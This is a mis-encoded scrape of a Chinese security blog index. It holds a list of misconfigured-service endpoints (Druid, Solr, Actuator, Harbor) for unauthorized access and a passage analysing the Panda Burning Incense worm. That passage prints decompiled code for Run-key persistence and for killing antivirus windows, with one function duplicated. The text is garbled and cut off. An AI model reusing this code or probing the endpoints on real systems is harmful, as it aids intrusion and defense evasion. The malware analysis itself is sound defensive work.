é…ç½®ä¸å½“å¯¼è‡´æœªæˆæƒè®¿é—®æ¼æ´ æ¼æ´åˆ©ç”¨ï¼štelnet ip port Druid æœªæˆæƒè®¿é—® ç«¯å£ï¼š/ ä»‹ç»ï¼šDruidæ˜¯é˜¿é‡Œå·´å·´æ•°æ®åº“å‡ºå“çš„ï¼Œä¸ºç›‘æ§è€Œç”Ÿçš„æ•°æ®åº“è¿æ¥æ± ï¼Œå¹¶ä¸”Druidæä¾›çš„ç›‘æ§åŠŸèƒ½ï¼Œç›‘æ§SQLçš„æ‰§è¡Œæ—¶é—´ã€ç›‘æ§Web URIçš„è¯·æ±‚ã€Sessionç›‘æ§ï¼Œé¦–å…ˆDruidæ˜¯ä¸å­˜åœ¨ä»€ä¹ˆæ¼æ´çš„ã€‚ä½†å½“å¼€å‘è€…é…ç½®ä¸å½“æ—¶å°±å¯èƒ½é€ æˆæœªæˆæƒè®¿é—® æ¼æ´åˆ©ç”¨ï¼š /druid/index.html /druid/websession.html /druid/datasource.html /druid/sql.html /druid/spring.html Solr æœªæˆæƒè®¿é—® ç«¯å£ï¼š443,8443 ä»‹ç»ï¼šSolræ˜¯ä¸€ä¸ªé«˜æ€§èƒ½ï¼Œé‡‡ç”¨Javaå¼€å‘ï¼ŒåŸºäºLuceneçš„å…¨æ–‡æœç´¢æœåŠ¡å™¨ã€‚solrçš„ç®¡ç†ç•Œé¢é€šå¸¸åŒ…å«å¦‚ä¸‹ä¿¡æ¯ï¼šsolrçš„é…ç½®ä¿¡æ¯ï¼ˆåŒ…æ‹¬è·¯å¾„ï¼Œç”¨æˆ·åï¼Œç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯ï¼‰ï¼Œæ•°æ®åº“çš„é…ç½®ä¿¡æ¯ï¼ˆåœ°å€ï¼Œç”¨æˆ·åï¼Œå¯†ç ï¼‰ï¼Œæ•°æ®åº“æœç´¢æ•°æ®ç­‰ã€‚solræœªæˆæƒè®¿é—®çš„å±å®³å¾ˆå¤§ï¼Œè½»åˆ™å¯æŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“ä¿¡æ¯ï¼Œé‡åˆ™å¯è¯»å–ç³»ç»Ÿä»»æ„æ–‡ä»¶ï¼Œç”šè‡³getshell æ¼æ´åˆ©ç”¨ /solr/admin SpringBoot Actuator æœªæˆæƒè®¿é—® ç«¯å£ï¼š/ ä»‹ç»ï¼šActuator æ˜¯ springboot æä¾›çš„ç”¨æ¥å¯¹åº”ç”¨ç³»ç»Ÿè¿›è¡Œè‡ªçœå’Œç›‘æ§çš„åŠŸèƒ½æ¨¡å—ï¼Œå€ŸåŠ©äº Actuator å¼€å‘è€…å¯ä»¥å¾ˆæ–¹ä¾¿åœ°å¯¹åº”ç”¨ç³»ç»ŸæŸäº›ç›‘æ§æŒ‡æ ‡è¿›è¡ŒæŸ¥çœ‹ã€ç»Ÿè®¡ç­‰ã€‚åœ¨ Actuator å¯ç”¨çš„æƒ…å†µä¸‹ï¼Œå¦‚æœæ²¡æœ‰åšå¥½ç›¸å…³æƒé™æ§åˆ¶ï¼Œéæ³•ç”¨æˆ·å¯é€šè¿‡è®¿é—®é»˜è®¤çš„æ‰§è¡Œå™¨ç«¯ç‚¹ï¼ˆendpointsï¼‰æ¥è·å–åº”ç”¨ç³»ç»Ÿä¸­çš„ç›‘æ§ä¿¡æ¯ï¼Œä»è€Œå¯¼è‡´ä¿¡æ¯æ³„éœ²ç”šè‡³æœåŠ¡å™¨è¢«æ¥ç®¡çš„äº‹ä»¶å‘ç”Ÿã€‚ æ¼æ´åˆ©ç”¨ï¼š /actuator/autoconfig /actuator/env /actuator/dump /actuator/headdump å¯ä¸‹è½½ SwaggerUIæœªæˆæƒè®¿é—®æ¼æ´ ç«¯å£ï¼š/ ä»‹ç»ï¼šSwagger æ˜¯ä¸€ä¸ªè§„èŒƒä¸”å®Œæ•´çš„æ¡†æ¶ï¼Œç”¨äºç”Ÿæˆã€æè¿°ã€è°ƒç”¨å’Œå¯è§†åŒ– RESTful é£æ ¼çš„ Web æœåŠ¡ã€‚ æ¼æ´åˆ©ç”¨ï¼š swagger-uiæœªç›´æ¥éƒ¨åœ¨IPæ ¹ç›®å½•ä¸‹ ç›´æ¥è®¿é—® Harboræœªæˆæƒæ·»åŠ ç®¡ç†å‘˜æ¼æ´ ç«¯å£ï¼š/ ä»‹ç»ï¼šHarboræœªæˆæƒæ·»åŠ ä»»æ„ç®¡ç†å‘˜æ¼æ´ã€‚æ”»å‡»è€…å¯é€šè¿‡æ„é€ ç‰¹å®šçš„å­—ç¬¦ä¸²ï¼Œåœ¨æœªæˆæƒçš„æƒ…å†µä¸‹ç›´æ¥åˆ›å»ºç®¡ç†å‘˜è´¦å·ï¼Œä»è€Œæ¥ç®¡Harboré•œåƒä»“åº“ æ¼æ´åˆ©ç”¨ï¼š /harbor/sign-in æ³¨å†Œç®¡ç†å‘˜ åƒæˆ‘ä»¬å®éªŒå®¤çš„å†…éƒ¨ç³»ç»Ÿå°±æ˜¯ç”¨çš„è¿™ä¸ªä»“åº“ï¼ŒåŠŸèƒ½å°±æ˜¯æŠŠdockeræ‰“åŒ…çš„é•œåƒä¼ ä¸Šå»","link":"/2025/12/18/%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9C%8D%E5%8A%A1%E5%88%A9%E7%94%A8/"},{"title":"","text":"ä¼ ç»Ÿç—…æ¯’ååˆ†ææ€è·¯ å‰è¨€æœ¬æ–‡å¯¹ä¼ ç»Ÿç—…æ¯’ï¼ˆç†ŠçŒ«çƒ§é¦™2.0ï¼‰è¿›è¡Œäº†ç³»ç»Ÿæ€§é€†å‘åˆ†æã€‚è¯¥ç—…æ¯’æ´»è·ƒäº2006â€“2007å¹´ï¼Œæ›¾åœ¨ä¸­å›½é€ æˆå¤§è§„æ¨¡æ„ŸæŸ“ï¼Œå…¶æ ¸å¿ƒç‰¹å¾åŒ…æ‹¬ï¼šé€šè¿‡Uç›˜å’Œå±€åŸŸç½‘è‡ªåŠ¨ä¼ æ’­ã€æ„ŸæŸ“å¯æ‰§è¡Œæ–‡ä»¶å¹¶æ›¿æ¢æ¡Œé¢å›¾æ ‡ä¸ºâ€œç†ŠçŒ«çƒ§é¦™â€ã€å¼ºåŠ›å¯¹æŠ—æ€æ¯’è½¯ä»¶ã€ä»¥åŠå¤šé‡æŒä¹…åŒ–æœºåˆ¶ã€‚æœ¬æŠ¥å‘Šè¯¦ç»†å‰–æäº†å…¶æ³¨å†Œè¡¨è‡ªå¯åŠ¨ã€çª—å£æ£€æµ‹å…³é—­å®‰å…¨å·¥å…·ã€ç½‘ç»œå…±äº«æšä¸¾ã€ç§»åŠ¨å­˜å‚¨è‡ªåŠ¨è¿è¡Œç­‰å…³é”®æŠ€æœ¯æ¨¡å—ï¼Œå¹¶ç»“åˆç°ä»£å®‰å…¨è§†è§’è¯„ä¼°å…¶å½“å‰å¨èƒç­‰çº§ï¼ŒåŒæ—¶æä¾›å®Œæ•´çš„åº”æ€¥å¤„ç½®ä¸æ¸…é™¤æ–¹æ¡ˆï¼Œä¸ºç†è§£ä¼ ç»Ÿè •è™«ç—…æ¯’çš„æ”»å‡»èŒƒå¼åŠé˜²å¾¡æ¼”è¿›æä¾›é‡è¦å‚è€ƒã€‚ ç†ŠçŒ«çƒ§é¦™2.01. åŸºæœ¬ä¿¡æ¯æ–‡ä»¶å: setup.exe æ–‡ä»¶å“ˆå¸Œå€¼: MD5: ad41ec81ab55c17397d3d6039752b0fd SHA256: aee99bc628b7c16a418560d4712f7dabfe8c273b4b78d8dbf804ccd7b6ea15e1 CRC32: 0x902e661b æ–‡ä»¶å¤§å°: 59KB 2. ç—…æ¯’ç‰¹å¾é€šè¿‡é€†å‘åˆ†æï¼Œç¡®è®¤è¯¥æ ·æœ¬æ˜¯ç†ŠçŒ«çƒ§é¦™2.0ç—…æ¯’ï¼Œå…·æœ‰ä»¥ä¸‹ç‰¹å¾ï¼š 2.1 è¿›ç¨‹ä¸æœåŠ¡ åˆ›å»ºæ¶æ„è¿›ç¨‹ spoclsv.exe å¹¶å°†å…¶å†™å…¥ drivers ç›®å½• ä½¿ç”¨ Windows ç³»ç»ŸæœåŠ¡åç§°ä¼ªè£…è‡ªèº« 2.2 è‡ªå¯åŠ¨æœºåˆ¶ ä¿®æ”¹æ³¨å†Œè¡¨ SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run åˆ›å»º Desktop_.ini æ–‡ä»¶å®ç°æŒä¹…åŒ– åœ¨æ‰€æœ‰ç”¨æˆ·çš„å¯åŠ¨ç›®å½•æ·»åŠ æ¶æ„ç¨‹åº åˆ›å»º autorun.inf æ–‡ä»¶å®ç°Uç›˜ç­‰ç§»åŠ¨å­˜å‚¨è®¾å¤‡è‡ªåŠ¨è¿è¡Œ sub_4052CCâ€“Windows æ³¨å†Œè¡¨å†™å…¥æ“ä½œï¼Œä¸»è¦ç”¨äºå‘æŒ‡å®šæ³¨å†Œè¡¨è·¯å¾„å†™å…¥ä¸€ä¸ªå­—ç¬¦ä¸²å€¼ï¼ˆREG_SZï¼‰ï¼Œå®ç°æŒä¹…åŒ– 1234567891011121314151617LSTATUS __userpurge sub_4052CC@&lt;eax&gt;(LPCSTR lpValueName@&lt;ecx&gt;, LPCSTR lpSubKey@&lt;edx&gt;, HKEY hKey@&lt;eax&gt;, BYTE *lpData)//lpValueNameè¦åˆ›å»ºçš„æ³¨å†Œè¡¨çš„å€¼åï¼ˆå¦‚ &quot;MyBackdoor&quot;ï¼‰//LPCSTR lpSubKey@&lt;edx&gt;å­å¥è·¯å¾„ï¼ˆå¦‚ &quot;Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run&quot;ï¼‰//HKEY hKey@&lt;eax&gt; [in] æ ¹é”®ï¼ˆå¦‚ HKEY_CURRENT_USER æˆ– HKEY_LOCAL_MACHINEï¼‰//BYTE *lpData [in] è¦å†™å…¥çš„æ•°æ®ï¼ˆé€šå¸¸æ˜¯å­—ç¬¦ä¸²ï¼Œå¦‚ &quot;C:\\\\malware.exe&quot;ï¼‰{ int v5; // eax DWORD dwDisposition; // [esp+8h] [ebp-8h] BYREF HKEY phkResult; // [esp+Ch] [ebp-4h] BYREF phkResult = 0; dwDisposition = 1; RegCreateKeyExA(hKey, lpSubKey, 0, 0, 0, 0xF003Fu, 0, &amp;phkResult, &amp;dwDisposition);//åˆ›å»ºæ‰“å¼€æ³¨å†Œè¡¨å­é”® v5 = sub_4052B4(); //è·å–æ•°æ®é•¿åº¦ RegSetValueExA(phkResult, lpValueName, 0, 1u, lpData, v5 + 1);//å†™å…¥æ³¨å†Œè¡¨å€¼ return RegCloseKey_0(phkResult); //å…³é—­å¥æŸ„å¹¶è¿”å›} 123456ä¸Šé¢çš„è¯¦ç»†æµç¨‹é€šè¿‡ RegCreateKeyExA åˆ›å»ºæ³¨å†Œè¡¨é¡¹æ“ä½œè·¯å¾„ï¼š Software\\Microsoft\\Windows\\CurrentVersion\\Runè®¾ç½® svcshare é”®å€¼æŒ‡å‘ç—…æ¯’ç¨‹åºä½¿ç”¨ RegSetValueExA å†™å…¥é”®å€¼æ•°æ®æœ€åé€šè¿‡ RegCloseKey_0 å…³é—­æ³¨å†Œè¡¨å¥æŸ„ å¯åŠ¨æ–‡ä»¶å¤¹è‡ªå¯åŠ¨ ç›¸å…³åœ°å€ ï¼š0x40a584ã€0x40a610ã€0x40a640 å­—ç¬¦ä¸²å¼•ç”¨ ï¼š Start Menu\\Programs\\Startup æœºåˆ¶ ï¼šå°†ç—…æ¯’æ–‡ä»¶å¤åˆ¶åˆ°ç³»ç»Ÿå¯åŠ¨æ–‡ä»¶å¤¹ï¼Œå®ç°å¼€æœºè‡ªåŠ¨è¿è¡Œ 2.3 åæ€æ¯’èƒ½åŠ› æ£€æµ‹å¹¶ç»ˆæ­¢å¤šç§æ€æ¯’è½¯ä»¶è¿›ç¨‹ï¼ŒåŒ…æ‹¬ï¼š ç‘æ˜Ÿç³»åˆ—: Ravmond.exe, CCenter.exe, RavTask.exe ç­‰ é‡‘å±±ç³»åˆ—: KVXP.kxp, KvMonXP.kxp ç­‰ è¯ºé¡¿ç³»åˆ—: Symantec AntiVirus ç›¸å…³è¿›ç¨‹ McAfeeã€NOD32ç­‰å…¶ä»–å®‰å…¨è½¯ä»¶ ç¦ç”¨ä»»åŠ¡ç®¡ç†å™¨å’Œæ³¨å†Œè¡¨ç¼–è¾‘å™¨ ä¿®æ”¹ç³»ç»Ÿè®¾ç½®éšè—æ–‡ä»¶ sub_4062C8â€“æ€æ¯’è½¯ä»¶æ£€æµ‹ä¸ç»ˆæ­¢ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199int __stdcall sub_4062C8(){ HWND hWndChildAfter; // ebx HWND hWndParent; // edi HWND hWndParent_1; // edi HWND hWndParent_2; // eax HWND hWnd; // eax BYTE bScan; // al BYTE bScan_1; // al BYTE bScan_2; // al BYTE bScan_3; // al BYTE bScan_4; // al BYTE bScan_5; // al BYTE bScan_6; // al BYTE bScan_7; // al unsigned int v14[6]; // [esp-Ch] [ebp-108h] BYREF CHAR String[101]; // [esp+97h] [ebp-65h] BYREF int savedregs; // [esp+FCh] [ebp+0h] BYREF v14[2] = (unsigned int)&amp;savedregs; v14[1] = (unsigned int)&amp;loc_406BF1; v14[0] = (unsigned int)NtCurrentTeb()-&gt;NtTib.ExceptionList; __writefsdword(0, (unsigned int)v14); sub_406218(); hWndChildAfter = 0; hWndParent = GetDesktopWindow(); do { hWndChildAfter = FindWindowExA(hWndParent, hWndChildAfter, 0, 0); GetWindowTextA(hWndChildAfter, String, 101); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); } while ( hWndChildAfter ); hWndParent_1 = GetDesktopWindow(); do { hWndChildAfter = FindWindowExA(hWndParent_1, hWndChildAfter, 0, 0); hWndParent_2 = FindWindowExA(hWndChildAfter, 0, &quot;msctls_statusbar32&quot;, 0); hWnd = FindWindowExA(hWndParent_2, 0, 0, 0); GetWindowTextA(hWnd, String, 101); sub_403EB4(101, String); if ( sub_4041B4() ) { PostMessageA(hWndChildAfter, 0x12u, 0, 0); bScan = MapVirtualKeyA(0x11u, 0); keybd_event(0x11u, bScan, 0, 0); bScan_1 = MapVirtualKeyA(0x12u, 0); keybd_event(0x12u, bScan_1, 0, 0); bScan_2 = MapVirtualKeyA(0x44u, 0); keybd_event(0x44u, bScan_2, 0, 0); bScan_3 = MapVirtualKeyA(0x44u, 0); keybd_event(0x44u, bScan_3, 2u, 0); bScan_4 = MapVirtualKeyA(0x11u, 0); keybd_event(0x11u, bScan_4, 2u, 0); bScan_5 = MapVirtualKeyA(0x12u, 0); keybd_event(0x12u, bScan_5, 2u, 0); if ( FindWindowA(0, &quot;IceSword&quot;) ) { bScan_6 = MapVirtualKeyA(0xDu, 0); keybd_event(0xDu, bScan_6, 0, 0); bScan_7 = MapVirtualKeyA(0xDu, 0); keybd_event(0xDu, bScan_7, 2u, 0); } } } while ( hWndChildAfter ); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); __writefsdword(0, v14[0]); return sub_403C68(&amp;loc_406BF8);} 1234567sub_4041B4() å­—ç¬¦ä¸²åŒ¹é…å‡½æ•°ï¼Œæ£€æµ‹çª—å£æ ‡é¢˜æ˜¯å¦åŒ…å«ï¼š&quot;ä»»åŠ¡ç®¡ç†å™¨&quot;&quot;Process Explorer&quot;&quot;ProcMon&quot;&quot;Wireshark&quot;&quot;è°ƒè¯•å™¨&quot;&quot;IceSword&quot;ï¼ˆå¤è€çš„è‘—åå†…æ ¸å·¥å…·ï¼Œç°åœ¨win10ï¼Œ11éƒ½ä¸ç”¨è¿™ä¸ªäº†ï¼‰ä¸“é—¨æ£€æµ‹ IceSword å¹¶æ¨¡æ‹ŸæŒ‰é”®ï¼ˆç®€å•æ¥è¯´å°±æ˜¯ä¸è®©ä½ æ‰“å¼€å¾—å¾—åŠŸèƒ½ï¼‰ sub_4060D4â€“Windows å¼‚å¸¸å¤„ç†ï¼ˆSEHï¼‰æ¡†æ¶ + èµ„æºæšä¸¾å¾ªç¯ çš„å‡½æ•°ï¼Œç”¨äºæšä¸¾ç³»ç»Ÿèµ„æºï¼ˆå¦‚çª—å£ã€è¿›ç¨‹ã€æ–‡ä»¶ã€é©±åŠ¨ï¼‰ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199int __stdcall sub_4062C8(){ HWND hWndChildAfter; // ebx HWND hWndParent; // edi HWND hWndParent_1; // edi HWND hWndParent_2; // eax HWND hWnd; // eax BYTE bScan; // al BYTE bScan_1; // al BYTE bScan_2; // al BYTE bScan_3; // al BYTE bScan_4; // al BYTE bScan_5; // al BYTE bScan_6; // al BYTE bScan_7; // al unsigned int v14[6]; // [esp-Ch] [ebp-108h] BYREF CHAR String[101]; // [esp+97h] [ebp-65h] BYREF int savedregs; // [esp+FCh] [ebp+0h] BYREF v14[2] = (unsigned int)&amp;savedregs; v14[1] = (unsigned int)&amp;loc_406BF1; v14[0] = (unsigned int)NtCurrentTeb()-&gt;NtTib.ExceptionList; __writefsdword(0, (unsigned int)v14); sub_406218(); hWndChildAfter = 0; hWndParent = GetDesktopWindow(); do { hWndChildAfter = FindWindowExA(hWndParent, hWndChildAfter, 0, 0); GetWindowTextA(hWndChildAfter, String, 101); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); sub_403EB4(101, String); if ( sub_4041B4() ) PostMessageA(hWndChildAfter, 0x12u, 0, 0); } while ( hWndChildAfter ); hWndParent_1 = GetDesktopWindow(); do { hWndChildAfter = FindWindowExA(hWndParent_1, hWndChildAfter, 0, 0); hWndParent_2 = FindWindowExA(hWndChildAfter, 0, &quot;msctls_statusbar32&quot;, 0); hWnd = FindWindowExA(hWndParent_2, 0, 0, 0); GetWindowTextA(hWnd, String, 101); sub_403EB4(101, String); if ( sub_4041B4() ) { PostMessageA(hWndChildAfter, 0x12u, 0, 0); bScan = MapVirtualKeyA(0x11u, 0); keybd_event(0x11u, bScan, 0, 0); bScan_1 = MapVirtualKeyA(0x12u, 0); keybd_event(0x12u, bScan_1, 0, 0); bScan_2 = MapVirtualKeyA(0x44u, 0); keybd_event(0x44u, bScan_2, 0, 0); bScan_3 = MapVirtualKeyA(0x44u, 0); keybd_event(0x44u, bScan_3, 2u, 0); bScan_4 = MapVirtualKeyA(0x11u, 0); keybd_event(0x11u, bScan_4, 2u, 0); bScan_5 = MapVirtualKeyA(0x12u, 0); keybd_event(0x12u, bScan_5, 2u, 0); if ( FindWindowA(0, &quot;IceSword&quot;) ) { bScan_6 = MapVirtualKeyA(0xDu, 0); keybd_event(0xDu, bScan_6, 0, 0); bScan_7 = MapVirtualKeyA(0xDu, 0); keybd_event(0xDu, bScan_7, 2u, 0); } } } while ( hWndChildAfter ); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); sub_4060D4(); __writefsdword(0, v14[0]); return sub_403C68(&amp;loc_406BF8);} ä½¿ç”¨ FindWindowExA æšä¸¾ç³»ç»Ÿçª—å£ é€šè¿‡ GetWindowTextA è·å–çª—å£æ ‡é¢˜ è°ƒç”¨ sub_4041B4 æ£€æµ‹çª—å£æ ‡é¢˜ä¸­çš„æ€æ¯’è½¯ä»¶ç‰¹å¾å­—ç¬¦ä¸² å½“æ£€æµ‹åˆ°æ€æ¯’è½¯ä»¶æ—¶ï¼Œä½¿ç”¨ PostMessageA å‘é€ WM_DESTROY ï¼ˆ0x12ï¼‰æ¶ˆæ¯å…³é—­çª—å£ è¿™äº›ä¸ªæ–¹æ³•å·²ç»è¿‡æ—¶äº† 12345678910IceSword æ˜¯ 2005â€“2010 å¹´æµè¡Œçš„å†…æ ¸å·¥å…·ï¼Œæ—©å°±å·²ç»åœæ­¢æ›´æ–°ï¼Œç°ä»£ Windowsï¼ˆWin10/11ï¼‰æ ¹æœ¬æ— æ³•è¿è¡Œè¡Œä¸ºç‰¹å¾åº“ä¸­æ—©å·²æ”¶å½•ï¼šFindWindow + PostMessage(WM_CLOSE) + &quot;ä»»åŠ¡ç®¡ç†å™¨&quot;keybd_event(VK_CONTROL) + VK_MENU + 'D'é«˜é¢‘è°ƒç”¨ CreateToolhelp32Snapshot + RegSetValueExäº‘æ²™ç®±ï¼ˆå¦‚ ANY.RUNã€Hybrid Analysisï¼‰ä¼šï¼šæ¨¡æ‹Ÿæ‰“å¼€â€œä»»åŠ¡ç®¡ç†å™¨â€çª—å£è§‚å¯Ÿæ ·æœ¬æ˜¯å¦å°è¯•å…³é—­å®ƒâ†’ ç›´æ¥æ ‡è®°ä¸ºæ¶æ„ ç—…æ¯’å†…ç½®äº†å¤šç§æ€æ¯’è½¯ä»¶çš„ç‰¹å¾å­—ç¬¦ä¸²è¿›è¡Œæ£€æµ‹ï¼š NOD32 Symantec Mcshield navapsvc VirusScan KAV (å¡å·´æ–¯åŸº) é”®ç›˜æ¨¡æ‹Ÿå¯¹æŠ— ä½¿ç”¨ keybd_event æ¨¡æ‹Ÿé”®ç›˜æ“ä½œæ¥å¹²æ‰°æ€æ¯’è½¯ä»¶çš„æ­£å¸¸è¿è¡Œ é€šè¿‡å¼‚å¸¸å¤„ç†æœºåˆ¶é¿å…è¢«æ€æ¯’è½¯ä»¶æ£€æµ‹åˆ° æ¥ä¸‹æ¥å°±å¯ä»¥æ“ä½œæ–‡ä»¶æ„ŸæŸ“ï¼ˆæ¡Œé¢å…¨å˜æˆç†ŠçŒ«çƒ§é¦™å›¾æ 